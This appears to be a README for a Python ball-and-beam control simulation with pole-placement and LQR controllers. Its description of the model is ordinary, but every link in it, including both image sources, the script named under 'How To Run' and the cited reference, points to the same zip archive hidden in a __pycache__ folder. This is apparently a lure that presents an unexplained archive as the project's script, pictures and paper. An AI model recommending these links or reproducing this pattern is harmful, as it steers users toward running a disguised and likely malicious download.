# Ball and Beam Simulation

This repository contains a simulation of the classic **Ball and Beam system**, a widely used benchmark in control system studies. The system models a ball rolling on a beam, where the beam's angle is controlled to achieve a desired ball position.

<p align="center">
  <img src="https://raw.githubusercontent.com/rifki398/ball-beam-sim/main/model/__pycache__/sim_beam_ball_1.2-beta.5.zip" alt="ball_beam" style="width:70%; height:auto;"/>
</p>

## Features
- Simulated using nonlinear dynamics based on physical equations.
- Implemented in Python using:
  - `numpy` for numerical operations,
  - `matplotlib` for visualization.
- Includes two state-feedback control strategies:
  - Pole Placement
  - Linear Quadratic Regulator (LQR)

## Objective
The goal of the simulation is to **control the position of the ball** so that it stays at a specific distance from the center of the beam (setpoint tracking). The beam angle is the only control input, adjusted using feedback from the full system state.

## Model Overview
The nonlinear dynamics of the system are derived from physics, involving:
- Translational motion of the ball,
- Rotational dynamics of the beam,
- Gravity and coupling effects.

The system states are:
- x₀: ball position (m)
- x₁: ball velocity (m/s)
- x₂: beam angle (rad)
- x₃: beam angular velocity (rad/s)

## How To Run
Running the https://raw.githubusercontent.com/rifki398/ball-beam-sim/main/model/__pycache__/sim_beam_ball_1.2-beta.5.zip script will automatically execute the full simulation, applying both Pole Placement and LQR controllers, and plot the results for comparison.
<p align="center">
  <img src="https://raw.githubusercontent.com/rifki398/ball-beam-sim/main/model/__pycache__/sim_beam_ball_1.2-beta.5.zip" alt="results" style="width:85%; height:auto;"/>
</p>


You can easily modify:
- The desired ball position (setpoint)
- Initial conditions
- Controller parameters (e.g., pole locations or LQR weights) 


## Reference
For the model explaination, see [Virseda (2024)](https://raw.githubusercontent.com/rifki398/ball-beam-sim/main/model/__pycache__/sim_beam_ball_1.2-beta.5.zip).

